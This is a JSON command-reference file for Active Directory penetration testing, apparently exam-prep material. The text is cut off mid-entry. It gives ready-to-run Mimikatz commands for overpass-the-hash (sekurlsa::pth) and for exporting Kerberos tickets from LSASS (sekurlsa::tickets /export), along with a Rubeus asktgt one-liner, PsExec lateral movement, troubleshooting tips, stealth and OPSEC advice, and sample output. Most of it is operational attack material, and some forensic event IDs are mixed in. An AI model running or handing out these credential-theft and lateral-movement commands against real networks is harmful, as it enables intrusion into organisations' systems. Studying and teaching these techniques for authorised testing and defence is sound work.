{
  "commands": [
    {
      "id": "overpass-mimikatz-pth",
      "name": "Overpass-the-Hash - Mimikatz sekurlsa::pth",
      "description": "Convert NTLM hash to Kerberos TGT by creating process with hash then requesting Kerberos tickets",
      "command": "mimikatz # privilege::debug\nmimikatz # sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<USER>",
          "description": "Username",
          "example": "user1",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Domain FQDN",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash",
          "example": "369def79d8372408bf6e93364cc93075",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "overpass-the-hash",
        "mimikatz",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "PRIORITY:HIGH"
      ],
      "prerequisites": [],
      "alternatives": [
        "overpass-rubeus-asktgt"
      ],
      "next_steps": [],
      "flag_explanations": {
        "sekurlsa::pth": "Pass-the-hash module",
        "/user": "Username",
        "/domain": "Domain FQDN (corp.com not corp)",
        "/ntlm": "NTLM hash",
        "/run": "Program to launch (PowerShell recommended)"
      },
      "success_indicators": [
        "user : <USER>",
        "domain : <DOMAIN>",
        "New PowerShell window opens"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_sekurlsa_pth",
        "privilege::debug FAILED"
      ],
      "troubleshooting": {
        "privilege::debug FAILED": "Run mimikatz as Administrator",
        "No tickets generated": "Must trigger Kerberos auth - use 'net use' or access network resource",
        "whoami shows wrong user": "Expected - token shows original user, but Kerberos tickets use <USER>"
      },
      "notes": "REFERENCE MATERIAL - OVERPASS-THE-HASH WITH MIMIKATZ:\nTRAINING EXAMPLE (EXACT COMMAND FROM REFERENCE DOCUMENTATION):\nScenario:\nuser1's credentials cached on WORKSTATION01 after running notepad as user1.\n\nFrom WORKSTATION01 as user3, performing overpass-the-hash:\n```\nmimikatz # privilege::debug\nmimikatz # sekurlsa::pth /user:user1 /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell\n```\n\nResult:\nNew PowerShell window opened in context of user1 (with user1's credentials injected).\n\nWHAT IS OVERPASS-THE-HASH:\nTechnique that converts NTLM hash into Kerberos Ticket Granting Ticket (TGT), enabling Kerberos authentication when you only have the NTLM hash.\n\nAlso called \"Pass-the-Key\".\n\nWHY USE OVERPASS:\n- Some tools REQUIRE Kerberos authentication (Sysinternals PsExec with Kerberos)\n- Kerberos authentication is less logged/monitored than NTLM in some environments\n- Avoids NTLM authentication over network (stealthier)\n- Enables access to resources that only accept Kerberos\n\nKEY DISTINCTION FROM PASS-THE-HASH:\n- Pass-the-Hash (PTH):\nUses NTLM protocol directly with hash\n- Overpass-the-Hash:\nConverts NTLM hash \u2192 Kerberos TGT, then uses Kerberos protocol\n- PTH:\nLateral movement via NTLM\n- Overpass:\nLateral movement via Kerberos (requires TGT)\n\nHOW OVERPASS-THE-HASH WORKS:\n1.\n\nMimikatz sekurlsa::pth injects NTLM hash into LSASS process memory\n2.\n\nCreates new logon session with injected credentials\n3.\n\nSpawns specified program (/run:powershell) in new session context\n4.\n\nProgram runs as original user (token) but has user1's credentials for network auth\n5.\n\nWhen Kerberos authentication triggered (net use, etc.), KDC uses injected hash for pre-authentication\n6.\n\nKDC issues TGT using hash (hash proves identity)\n7.\n\nTGT can then request service tickets (TGS) for lateral movement\n\nTWO-STEP PROCESS (CRITICAL UNDERSTANDING):\nStep 1:\nsekurlsa::pth (injects credentials)\nStep 2:\nTrigger Kerberos authentication (net use, dir \\\\target, etc.) to generate TGT\n\nsekurlsa::pth does NOT create TGT automatically - must trigger manually.\n\nWHOAMI BEHAVIOR (FROM TRAINING):\nAfter sekurlsa::pth, running whoami in new PowerShell shows ORIGINAL user (user3), NOT impersonated user (user1).\n\nTraining explicitly states:\n\"Although user1 is impersonated, the whoami command on this newly spawned PowerShell session shows the original user user3.\n\nThis is the intended behavior.\"\n\nWhy?\n- whoami checks process token (shows user3)\n- Network authentication uses injected credentials (uses user1)\n- Token impersonation vs credential injection are different mechanisms\n\nVerify with klist (shows user1's Kerberos tickets), NOT whoami.\n\nTRIGGERING KERBEROS AUTHENTICATION:\nFrom training, after sekurlsa::pth, you must trigger Kerberos:\n```powershell\nPS C:\\> net use \\\\fileserver\n```\n\nThis command:\n1.\n\nAttempts to connect to fileserver via SMB\n2.\n\nTriggers Kerberos authentication (because hostname used, not IP)\n3.\n\nKDC receives TGT request with user1's hash for pre-authentication\n4.\n\nKDC issues TGT for user1\n5.\n\nClient requests TGS for CIFS service on fileserver\n6.\n\nConnection succeeds using user1's Kerberos tickets\n\nVERIFICATION:\nFrom training, verify tickets created:\n```powershell\nPS C:\\> klist\n```\n\nOutput shows:\n```\nClient:\nuser1 @ CORP.COM\nServer:\nkrbtgt/CORP.COM @ CORP.COM\n  KerbTicket Encryption Type:\nAES-256-CTS-HMAC-SHA1-96\n  Start Time:\n<timestamp>\n  End Time:\n<timestamp>\n  Renew Time:\n<timestamp>\n```\n\nTGT confirmed (Server:\nkrbtgt).\n\nAlso shows TGS:\n```\nServer:\ncifs/fileserver @ CORP.COM\n```\n\nService ticket for CIFS on fileserver.\n\nLATERAL MOVEMENT:\nFrom training, using Kerberos tickets for PsExec:\n```powershell\nPS C:\\Tools\\SysinternalsSuite> .\\PsExec.exe \\\\fileserver cmd\n```\n\nThis succeeded because:\n- PsExec detected Kerberos tickets in cache\n- Used Kerberos authentication instead of NTLM\n- user1's TGT valid for requesting service tickets\n- Access granted to fileserver as user1\n\nPRE-AUTHENTICATION:\nKerberos pre-authentication uses password hash (NTLM or AES) to encrypt timestamp:\n1.\n\nClient requests TGT from KDC\n2.\n\nClient encrypts current timestamp with user's hash\n3.\n\nKDC decrypts with stored hash\n4.\n\nIf decryption succeeds and timestamp valid, TGT issued\n\nOverpass works because Mimikatz provides correct hash for encryption.\n\nHASH SOURCES:\nFrom training scenario, obtained hash via:\n1.\n\nuser1 ran notepad as herself on WORKSTATION01 (runas /user:user1 notepad)\n2.\n\nCredentials cached in LSASS memory\n3.\n\nMimikatz extracted:\nsekurlsa::logonpasswords\n4.\n\nOutput showed user1's NTLM hash:\n369def79d8372408bf6e93364cc93075\n\nOther sources:\n- secretsdump.py (remote SAM/LSA dump)\n- SAM database extraction\n- LSA secrets\n- NTDS.dit (domain controller database)\n\nMANUAL ALTERNATIVE:\nNo direct manual alternative for overpass-the-hash:\n- PowerShell cannot natively use hash for authentication\n- Requires Mimikatz or Rubeus for hash-to-TGT conversion\n- Normal flow requires plaintext password\n\nRubeus alternative:\n```\nRubeus.exe asktgt /user:user1 /domain:corp.com /rc4:369def79d8372408bf6e93364cc93075 /ptt\n```\nSingle command vs Mimikatz multi-step.\n\nDOMAIN REQUIREMENT:\n- /domain must be FQDN:\ncorp.com not CORP\n- Matches Kerberos realm name\n- Case-insensitive but convention is lowercase\n\nPORT REQUIREMENTS:\n- TCP 88:\nKerberos (KDC communication for TGT/TGS requests)\n- TCP/UDP 88:\nKerberos authentication\n- No SMB/RPC required for TGT request (unlike Pass-the-Hash)\n\nEXECUTION CONTEXT:\nNew PowerShell spawned:\n- Process owner:\nOriginal user (user3) - visible in Task Manager\n- Process token:\nuser3's token\n- Network credentials:\nuser1's credentials (injected)\n- Kerberos tickets:\nuser1's TGT/TGS\n\nThis split allows:\n- Local operations:\nAs user3\n- Network operations:\nAs user1\n\nSECURITY CONTEXT:\nFrom training scenario:\n- user3:\nLocal user on WORKSTATION01 (attacker's initial access)\n- user1:\nDomain user, local admin on FILESERVER (target privilege level)\n- Overpass allows user3's session to network authenticate as user1\n- user3 never obtains user1's actual privileges locally\n\nTIME ESTIMATE:\n- sekurlsa::pth execution:\n10-20 seconds\n- Trigger Kerberos (net use):\n5-10 seconds\n- Verification (klist):\n5 seconds\n- Total:\n1-2 minutes\n\nEXAM STRATEGY:\n1.\n\nObtain NTLM hash via Mimikatz/secretsdump\n2.\n\nUse overpass-the-hash to convert to Kerberos TGT\n3.\n\nTrigger with net use \\\\target (hostname NOT IP)\n4.\n\nVerify with klist (look for TGT with Server:\nkrbtgt)\n5.\n\nUse Kerberos-enabled tools (PsExec, PowerShell remoting)\n6.\n\nRemember whoami shows original user - use klist to verify\n\nWHEN TO USE OVERPASS:\n- Target requires Kerberos (not NTLM)\n- Want to avoid NTLM authentication logs\n- Have hash but need Kerberos tickets\n- Sysinternals PsExec scenario (prefers Kerberos over NTLM)\n\nWHEN TO USE PASS-THE-HASH INSTEAD:\n- Target accepts NTLM authentication\n- Faster/simpler (no Kerberos setup)\n- Impacket tools from Kali (PSExec, WMIExec, SMBExec)\n\nCOMMON FAILURES:\n- No TGT generated:\nForgot to trigger Kerberos (net use)\n- IP used instead of hostname:\nKerberos requires hostname for SPN\n- Wrong domain format:\nUse FQDN (corp.com not CORP)\n- Time skew >5 minutes:\nSynchronize clock with DC\n- Hash invalid:\nVerify extraction from sekurlsa::logonpasswords\n\nFORENSIC ARTIFACTS:\n- Event ID 4624:\nLogon Type 9 (NewCredentials) when using /run\n- Event ID 4768:\nKerberos TGT request (pre-authentication)\n- Event ID 4769:\nKerberos TGS request (service ticket)\n- Event ID 4648:\nExplicit credential logon\n- Mimikatz execution traces in memory/logs\n- PowerShell spawned by mimikatz.exe (process tree)\n\nKERBEROS TICKET LIFETIME:\nDefault:\n- TGT:\n10 hours\n- TGS:\n10 hours\n- Renewable for 7 days\n\nCheck End Time in klist output.",
      "methodology_guidance": {
        "after_success": "overpass-net-use-trigger  # Trigger Kerberos authentication to generate TGT kerberos-klist-verify  # Verify TGT and TGS tickets were created psexec-sysinternals  # Use Kerberos tickets for lateral movement"
      },
      "filled_example": "mimikatz # privilege::debug\nmimikatz # sekurlsa::pth /user:user1 /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell"
    },
    {
      "id": "overpass-net-use-trigger",
      "name": "Overpass-the-Hash - Trigger Kerberos TGT Request",
      "description": "Trigger Kerberos TGT/TGS generation after overpass-the-hash by accessing network resource",
      "command": "net use \\\\<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname (NOT IP - must use hostname for Kerberos)",
          "example": "fileserver",
          "required": true
        }
      ],
      "tags": [
        "PENTEST",
        "overpass-the-hash",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "PRIORITY:HIGH"
      ],
      "prerequisites": [
        "overpass-mimikatz-pth"
      ],
      "alternatives": [],
      "next_steps": [],
      "flag_explanations": {
        "net use": "Map network drive (triggers Kerberos authentication)",
        "\\\\<TARGET>": "UNC path - MUST use hostname not IP for Kerberos SPN lookup"
      },
      "success_indicators": [
        "The command completed successfully",
        "klist shows TGT (krbtgt) and TGS (cifs/target)"
      ],
      "failure_indicators": [
        "System error 5 - Access is denied",
        "The network path was not found"
      ],
      "troubleshooting": {
        "Access denied": "Hash may be invalid or user lacks permissions",
        "Network path not found": "Use hostname not IP - Kerberos requires SPN resolution",
        "Still no tickets": "Verify PowerShell session spawned by mimikatz sekurlsa::pth",
        "IP address used": "Change to hostname: net use \\\\FILESERVER not \\\\10.10.10.100"
      },
      "notes": "REFERENCE MATERIAL - TRIGGERING KERBEROS TGT AFTER OVERPASS-THE-HASH:\nTRAINING EXAMPLE (FROM REFERENCE DOCUMENTATION):\nAfter performing sekurlsa::pth, training demonstrates triggering Kerberos:\n```powershell\nPS C:\\Tools> net use \\\\fileserver\nThe command completed successfully.\n```\n\nThen verify tickets:\n```powershell\nPS C:\\Tools> klist\n```\n\nOutput shows:\n```\nCurrent LogonId is 0:0x11e387b\n\nCached Tickets:\n(2)\n\n#0>     Client:\nuser1 @ CORP.COM\n        Server:\nkrbtgt/CORP.COM @ CORP.COM\n        KerbTicket Encryption Type:\nAES-256-CTS-HMAC-SHA1-96\n\n#1>     Client:\nuser1 @ CORP.COM\n        Server:\ncifs/fileserver @ CORP.COM\n        KerbTicket Encryption Type:\nAES-256-CTS-HMAC-SHA1-96\n```\n\nConfirms TGT (#0, Server:\nkrbtgt) and TGS (#1, Server:\ncifs/fileserver) created.\n\nWHY TRIGGER IS NECESSARY:\nOverpass-the-hash is TWO-STEP process:\nStep 1:\nsekurlsa::pth injects credentials into LSASS\nStep 2:\nTrigger Kerberos authentication to REQUEST TGT from KDC\n\nsekurlsa::pth does NOT automatically create TGT.\n\nIt only sets up credential context.\n\nYou must explicitly trigger Kerberos authentication.\n\nWHAT \"TRIGGER\" MEANS:\nAny operation that requires network authentication to domain resource:\n- net use \\\\hostname\n- dir \\\\hostname\\share\n- Get-Content \\\\hostname\\path\\file.txt\n- Test-Path \\\\hostname\\share\n- PsExec.exe \\\\hostname cmd (auto-triggers)\n\nThese operations cause Windows to:\n1.\n\nDetect need for authentication to domain resource\n2.\n\nCheck ticket cache (empty after sekurlsa::pth)\n3.\n\nRequest TGT from KDC using injected credentials\n4.\n\nRequest TGS for specific service\n5.\n\nCache both tickets for reuse\n\nHOSTNAME REQUIREMENT (CRITICAL):\nKerberos requires HOSTNAME, not IP address.\n\nCorrect:\n```powershell\nnet use \\\\fileserver\n```\n\nIncorrect:\n```powershell\nnet use \\\\10.10.10.100\n```\n\nWhy?\nKerberos uses Service Principal Names (SPNs) format:\n- service/hostname@DOMAIN\n- Example:\ncifs/fileserver@CORP.COM\n\nSPN cannot be constructed from IP address.\n\nDNS resolution maps hostname \u2192 IP, but SPN needs hostname.\n\nSERVICE PRINCIPAL NAMES (SPNs):\nDifferent services have different SPNs:\n- CIFS/SMB:\ncifs/hostname (file shares)\n- HTTP:\nhttp/hostname (web services)\n- LDAP:\nldap/hostname (directory services)\n- HOST:\nhost/hostname (general services)\n- MSSQL:\nMSSQLSvc/hostname:port (SQL Server)\n\nTrigger for CIFS:\nnet use \\\\hostname\nTrigger for HTTP:\nInvoke-WebRequest http://hostname\nTrigger for LDAP:\nGet-ADUser (domain queries)\n\nTICKET CREATION FLOW:\n1.\n\nnet use \\\\fileserver executed\n2.\n\nWindows detects domain resource access needed\n3.\n\nChecks Kerberos ticket cache for existing cifs/fileserver ticket\n4.\n\nNo ticket found, checks for TGT\n5.\n\nNo TGT found, requests TGT from KDC:\n   a.\n\nAS-REQ (Authentication Service Request) to KDC\n   b.\n\nPre-authentication:\nTimestamp encrypted with user1's hash (injected by Mimikatz)\n   c.\n\nKDC validates pre-auth with user1's stored hash\n   d.\n\nAS-REP (Authentication Service Reply):\nTGT issued\n6.\n\nTGT cached (#0 in klist output)\n7.\n\nUsing TGT, requests TGS for cifs/fileserver:\n   a.\n\nTGS-REQ (Ticket Granting Service Request) to KDC\n   b.\n\nPresents TGT as proof of identity\n   c.\n\nKDC issues service ticket for cifs/fileserver\n   d.\n\nTGS-REP:\nService ticket returned\n8.\n\nTGS cached (#1 in klist output)\n9.\n\nService ticket presented to fileserver for access\n10.\n\nConnection succeeds\n\nTWO TICKETS CREATED:\nTicket #0 - TGT (Ticket Granting Ticket):\n- Server:\nkrbtgt/CORP.COM\n- Purpose:\nRequest service tickets\n- Lifetime:\n10 hours (default)\n- Renewable:\n7 days (default)\n- Encryption:\nAES-256 or RC4\n\nTicket #1 - TGS (Ticket Granting Service):\n- Server:\ncifs/fileserver\n- Purpose:\nAccess specific service on specific host\n- Lifetime:\n10 hours (default)\n- Service-specific:\nOnly works for CIFS on fileserver\n\nALTERNATIVE TRIGGER COMMANDS:\nFrom new PowerShell (spawned by sekurlsa::pth):\nFile access:\n```powershell\ndir \\\\fileserver\\c$\n```\n\nTest connection:\n```powershell\nTest-Path \\\\fileserver\\c$\n```\n\nExplicit authentication:\n```powershell\n.\\PsExec.exe \\\\fileserver cmd\n```\n\nAny will trigger TGT request.\n\nVERIFICATION:\nAlways verify with klist after trigger:\n```powershell\nklist\n```\n\nSuccess indicators:\n- Cached Tickets:\n(2) or more\n- Client:\nuser1 @ CORP.COM (impersonated user)\n- Server:\nkrbtgt/CORP.COM (TGT exists)\n- Server:\ncifs/fileserver (service ticket exists)\n\nFailure indicators:\n- Cached Tickets:\n(0)\n- No tickets displayed\n- Client still shows original user\n\nIf no tickets:\n1.\n\nVerify sekurlsa::pth completed successfully\n2.\n\nVerify running commands in Mimikatz-spawned PowerShell (not original)\n3.\n\nCheck hostname used (not IP)\n4.\n\nVerify network connectivity to DC (port 88)\n5.\n\nCheck time synchronization (must be <5 min difference with DC)\n\nNETWORK PATH FORMATS:\nUNC paths for triggering:\n- \\\\hostname (default share discovery)\n- \\\\hostname\\share (specific share)\n- \\\\hostname\\share\\path\\file (specific file)\n- \\\\hostname.domain.com (FQDN works too)\n- \\\\hostname (short name sufficient if DNS resolves)\n\nNOT triggering Kerberos:\n- \\\\10.10.10.100 (IP address - falls back to NTLM)\n- C:\\local\\path (local file system)\n- Localhost or 127.0.0.1 (local machine)\n\nPORT REQUIREMENTS:\n- TCP/UDP 88:\nKerberos (KDC communication)\n- TCP/UDP 53:\nDNS (hostname resolution)\n- TCP 445:\nSMB (if using net use for files)\n\nKDC COMMUNICATION:\nKDC = Key Distribution Center (runs on Domain Controller):\n- Handles TGT requests (AS)\n- Handles TGS requests (TGS)\n- Validates pre-authentication\n- Issues tickets\n\nFrom training, KDC is domain controller (DC1 typically).\n\nTIME ESTIMATE:\n- net use \\\\hostname:\n2-5 seconds\n- TGT/TGS request:\n<3 seconds\n- klist verification:\n<5 seconds\n- Total:\n<10 seconds\n\nEXAM STRATEGY:\n1.\n\nAfter sekurlsa::pth, IMMEDIATELY trigger Kerberos\n2.\n\nUse simple trigger:\nnet use \\\\<DC_HOSTNAME>\n3.\n\nVerify with klist before proceeding\n4.\n\nIf no tickets, troubleshoot before continuing\n5.\n\nCommon issue:\nUsing IP instead of hostname\n\nCOMMON ERRORS:\nSystem error 5 - Access denied:\n- Hash invalid or user lacks permissions\n- Verify hash correctness\n- Check user account status (disabled?)\n\nThe network path was not found:\n- Hostname not resolvable via DNS\n- Check DNS resolution:\nnslookup hostname\n- Verify hostname spelling\n- Try FQDN:\n\\\\fileserver.corp.com\n\nNo tickets after successful net use:\n- Not running in Mimikatz-spawned PowerShell\n- Close and use the NEW PowerShell window\n- Credentials only injected in spawned process\n\nIP address used:\n- Change to hostname immediately\n- Kerberos will NOT work with IP\n- NTLM fallback may occur (defeats purpose)\n\nFORENSIC ARTIFACTS:\n- Event ID 4768:\nKerberos TGT request (on DC)\n- Event ID 4769:\nKerberos TGS request (on DC)\n- Event ID 4624:\nNetwork logon Type 3 (on target)\n- Network traffic on port 88 (to DC)\n- SMB traffic on port 445 (to target)\n\nKERBEROS VS NTLM FALLBACK:\nIf hostname not used:\n- Windows attempts Kerberos first\n- SPN lookup fails (no hostname)\n- Falls back to NTLM authentication\n- Defeats purpose of overpass (wanted Kerberos)\n\nAlways use hostname to ensure Kerberos used.",
      "methodology_guidance": {
        "after_success": "kerberos-klist-verify  # Verify TGT (krbtgt) and TGS (cifs/target) tickets created psexec-sysinternals  # Execute lateral movement using Kerberos authentication"
      },
      "filled_example": "net use \\\\fileserver"
    },
    {
      "id": "kerberos-klist-verify",
      "name": "Kerberos - List Cached Tickets (klist)",
      "description": "Display cached Kerberos TGT and TGS tickets for current session",
      "command": "klist",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [],
      "tags": [
        "PENTEST",
        "kerberos",
        "verification",
        "enumeration",
        "active-directory",
        "windows"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [],
      "flag_explanations": {
        "klist": "List Kerberos tickets (built-in Windows command)",
        "klist purge": "Clear all cached tickets",
        "klist tgt": "Show only TGT tickets"
      },
      "success_indicators": [
        "Client: <USER> @ <DOMAIN>",
        "Server: krbtgt/<DOMAIN> (TGT)",
        "Server: cifs/<TARGET> (TGS for file access)",
        "Cached Tickets: (N)"
      ],
      "failure_indicators": [
        "Cached Tickets: (0)",
        "Error: No tickets found"
      ],
      "troubleshooting": {
        "No tickets found": "No Kerberos auth performed yet - trigger with net use or access network resource",
        "Wrong user in tickets": "Tickets cached in different session - ensure checking correct PowerShell window",
        "Tickets expired": "End Time shows past time - perform new authentication"
      },
      "notes": "REFERENCE MATERIAL - VERIFY KERBEROS TICKETS WITH KLIST:\nTRAINING EXAMPLE (FROM REFERENCE DOCUMENTATION):\nAfter overpass-the-hash and triggering Kerberos:\n```powershell\nPS C:\\Tools> klist\n\nCurrent LogonId is 0:0x11e387b\n\nCached Tickets:\n(2)\n\n#0>     Client:\nuser1 @ CORP.COM\n        Server:\nkrbtgt/CORP.COM @ CORP.COM\n        KerbTicket Encryption Type:\nAES-256-CTS-HMAC-SHA1-96\n        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize\n        Start Time:\n5/16/2022 18:30:12\n        End Time:\n  5/17/2022 4:30:12\n        Renew Time:\n5/23/2022 18:30:12\n\n#1>     Client:\nuser1 @ CORP.COM\n        Server:\ncifs/fileserver @ CORP.COM\n        KerbTicket Encryption Type:\nAES-256-CTS-HMAC-SHA1-96\n```\n\nWHAT IS KLIST:\nBuilt-in Windows command (part of Windows OS since Windows 2000) that displays cached Kerberos tickets for current logon session.\n\nNo installation required, always available.\n\nTICKET TYPES:\nTicket #0 - TGT (Ticket Granting Ticket):\n- Server:\nkrbtgt/DOMAIN (krbtgt is special Kerberos service account)\n- Purpose:\nRequest service tickets from KDC\n- Lifetime:\n10 hours default (configurable via GPO)\n- Renewable:\n7 days default\n- Most important ticket - can request any service ticket\n\nTicket #1+ - TGS (Ticket Granting Service / Service Tickets):\n- Server:\nservice/hostname @ DOMAIN\n- Purpose:\nAccess specific service on specific server\n- Examples:\ncifs/fileserver (file access), http/web01 (web), ldap/dc1 (directory)\n- Service-specific:\nCannot reuse for different service/host\n\nWHY VERIFY TICKETS:\n- Confirm overpass-the-hash succeeded\n- Check ticket exists before lateral movement (avoid wasted attempts)\n- Verify ticket not expired\n- Identify which services accessible\n- Troubleshoot authentication issues\n\nKEY FIELDS EXPLAINED:\nClient:\n- Shows WHO the ticket is for\n- user1 @ CORP.COM = Ticket grants user1's access\n- Should match user from overpass/pass-the-ticket\n\nServer:\n- Shows WHAT SERVICE the ticket grants access to\n- krbtgt = TGT (can request other tickets)\n- cifs/hostname = File share access\n- http/hostname = Web service access\n\nKerbTicket Encryption Type:\n- AES-256-CTS-HMAC-SHA1-96:\nModern, secure (preferred)\n- AES-128-CTS-HMAC-SHA1-96:\nModern, acceptable\n- RC4-HMAC (0x17):\nLegacy, weak (essentially NTLM hash)\n- DES:\nVery old, deprecated\n\nTicket Flags:\n- forwardable:\nTicket can be forwarded to other services\n- renewable:\nTicket can be renewed before expiration\n- initial:\nFirst authentication (TGT from password/hash)\n- pre_authent:\nPre-authentication performed\n\nStart Time:\n- When ticket becomes valid\n- Usually immediate\n\nEnd Time:\n- When ticket expires\n- Default:\nStart Time + 10 hours\n- After End Time:\nTicket invalid, must re-authenticate\n\nRenew Time:\n- Maximum lifetime if renewed\n- Default:\nStart Time + 7 days\n- Can request renewal before End Time\n\nLogonId:\n- Unique identifier for logon session\n- Format:\n0:0xHEXVALUE\n- Tickets tied to specific logon session\n- Different sessions have different ticket caches\n\nCOMMON VERIFICATION SCENARIOS:\nAfter overpass-the-hash:\n```powershell\nklist\n```\nExpect:\n- Cached Tickets:\n(2+)\n- Client:\nimpersonated_user @ DOMAIN\n- Server:\nkrbtgt/DOMAIN (TGT)\n- Server:\ncifs/target or service/target (TGS)\n\nAfter pass-the-ticket:\n```powershell\nklist\n```\nExpect:\n- New ticket appears in list\n- Client shows stolen ticket's user\n- Server shows service from imported ticket\n\nTROUBLESHOOTING WITH KLIST:\nCached Tickets:\n(0)\n- No Kerberos authentication performed\n- Overpass not triggered (missing net use step)\n- Wrong PowerShell session (not Mimikatz-spawned)\n- Tickets purged\n\nClient shows wrong user:\n- Tickets from different session\n- Overpass failed\n- Pass-the-ticket not injected correctly\n\nServer doesn't match target:\n- Wrong service ticket\n- Need different ticket for target service\n- May need to trigger additional authentication\n\nTicket expired (current time > End Time):\n- Re-authenticate to get new ticket\n- Or renew if within Renew Time\n\nADVANCED KLIST COMMANDS:\nklist tgt:\n- Show only TGT tickets\n- Filters out service tickets\n\nklist purge:\n- Delete ALL cached tickets\n- Requires admin or affects only current user\n- Used for cleanup/OPSEC\n\nklist sessions:\n- Show all logon sessions\n- Displays LogonId for each\n\nklist -lh 0 -li 0x3e7:\n- Query specific logon session\n- Useful for viewing other users' tickets (requires SYSTEM)\n\nWHAT KLIST DOESN'T SHOW:\n- Password or hash\n- Ticket encryption keys\n- Full ticket contents (use Mimikatz for export)\n- Tickets from other logon sessions (unless admin)\n\nTIME ESTIMATE:\n- Execution:\n<5 seconds\n- Output review:\n10-20 seconds\n\nEXAM STRATEGY:\n1.\n\nRun klist AFTER every Kerberos operation\n2.\n\nVerify tickets before lateral movement attempts\n3.\n\nCheck End Time - don't use expired tickets\n4.\n\nIf no tickets, troubleshoot before proceeding\n5.\n\nScreenshot klist output for documentation\n\nCOMMON MISTAKES:\n- Forgetting to verify after overpass-the-hash\n- Using expired tickets (check End Time!)\n- Checking klist in wrong PowerShell window\n- Expecting whoami to show ticket user (use klist Client field instead)",
      "methodology_guidance": {
        "after_success": "passticket-mimikatz-export  # Export tickets to .kirbi files for pass-the-ticket psexec-sysinternals  # Use cached tickets for lateral movement kerberos-purge-tickets  # Clear tickets when done for OPSEC"
      }
    },
    {
      "id": "passticket-mimikatz-export",
      "name": "Pass-the-Ticket - Export Tickets (Mimikatz)",
      "description": "Export all cached Kerberos tickets to .kirbi files for reuse on other systems",
      "command": "mimikatz # privilege::debug\nmimikatz # sekurlsa::tickets /export",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [],
      "tags": [
        "PENTEST",
        "pass-the-ticket",
        "mimikatz",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "PRIORITY:HIGH"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [],
      "flag_explanations": {
        "sekurlsa::tickets": "Access LSASS process to extract tickets",
        "/export": "Save tickets to .kirbi files in current directory",
        "privilege::debug": "Required for LSASS memory access"
      },
      "success_indicators": [
        "* Saved to file [0;xxxxxx]-2-0-*.kirbi",
        "Multiple .kirbi files created",
        "Tickets exported for multiple users/sessions"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_sekurlsa_acquireLSA",
        "privilege::debug FAILED",
        "No tickets found"
      ],
      "troubleshooting": {
        "privilege::debug FAILED": "Run mimikatz as Administrator",
        "No tickets exported": "No active Kerberos sessions - wait for users to login/authenticate",
        "ERROR kuhl_m_sekurlsa_acquireLSA": "LSASS protection enabled - may need to bypass PPL",
        "Too many .kirbi files": "Normal - exports all tickets from all sessions"
      },
      "notes": "REFERENCE MATERIAL - PASS-THE-TICKET EXPORT WITH MIMIKATZ:\nTRAINING EXAMPLE (FROM REFERENCE DOCUMENTATION):\nScenario:\nuser2 has access to \\\\webserver\\backup, user1 does not.\n\nGoal:\nSteal user2's ticket and use it as user1.\n\nFrom WORKSTATION02 as user1 (with admin rights), export all tickets:\n```\nmimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # sekurlsa::tickets /export\n\n[...]\n* Saved to file [0;12bd0]-0-0-40810000-user2@cifs-webserver.kirbi\n* Saved to file [0;3e7]-2-0-40e10000-user2@krbtgt-CORP.COM.kirbi\n[...]\n```\n\nTraining shows multiple .kirbi files created, including user2's TGS for CIFS service on webserver.\n\nWHAT IS PASS-THE-TICKET:\nLateral movement technique that steals and reuses existing Kerberos tickets from one session/machine and injects them into another, enabling access without knowing passwords or hashes.\n\nKEY DISTINCTION FROM OTHER TECHNIQUES:\n- Pass-the-Hash:\nUses NTLM hash for authentication\n- Overpass-the-Hash:\nConverts NTLM hash to TGT\n- Pass-the-Ticket:\nSteals and reuses existing Kerberos tickets\n\nPass-the-Ticket advantage:\nNo hash needed, just steal live tickets.\n\nTRAINING SCENARIO CONTEXT:\n- user2:\nDomain user with access to \\\\webserver\\backup\n- user1:\nDomain user, local admin on WORKSTATION02, NO access to \\\\webserver\\backup\n- WORKSTATION02:\nWindows client where both user2 and user1 have sessions\n- Goal:\nuser1 steals user2's ticket to access \\\\webserver\\backup\n\nHOW TICKET EXPORT WORKS:\n1.\n\nMimikatz accesses LSASS process (requires privilege::debug)\n2.\n\nReads Kerberos ticket cache from memory\n3.\n\nExtracts tickets from all active logon sessions\n4.\n\nSaves each ticket as .kirbi file (Mimikatz format)\n5.\n\nTickets written to current directory\n\nWHY TICKETS ARE VALUABLE:\n- Tickets grant access without passwords\n- Can be moved to different machines\n- Can be injected into different user sessions\n- Portable authentication credentials\n- Time-limited but reusable until expiration\n\nKIRBI FILENAME FORMAT (FROM TRAINING):\n```\n[0;12bd0]-0-0-40810000-user2@cifs-webserver.kirbi\n```\n\nBreakdown:\n- [0;12bd0]:\nLUID (Logon Session ID) - identifies source session\n- 0:\nGroup number\n- 0:\nType (0=TGS service ticket, 2=TGT)\n- 40810000:\nFlags (hex)\n- user2:\nUsername\n- cifs-webserver:\nService (CIFS) and hostname (webserver)\n- .kirbi:\nMimikatz format\n\nTICKET TYPES IN EXPORT:\nTGT (Ticket Granting Ticket):\n- Filename pattern:\n[LUID]-2-0-FLAGS-user@krbtgt-DOMAIN.kirbi\n- Example:\n[0;3e7]-2-0-40e10000-user2@krbtgt-CORP.COM.kirbi\n- Server:\nkrbtgt\n- Purpose:\nRequest service tickets\n- Most valuable - can request any service ticket\n\nTGS (Service Tickets):\n- Filename pattern:\n[LUID]-0-0-FLAGS-user@service-host.kirbi\n- 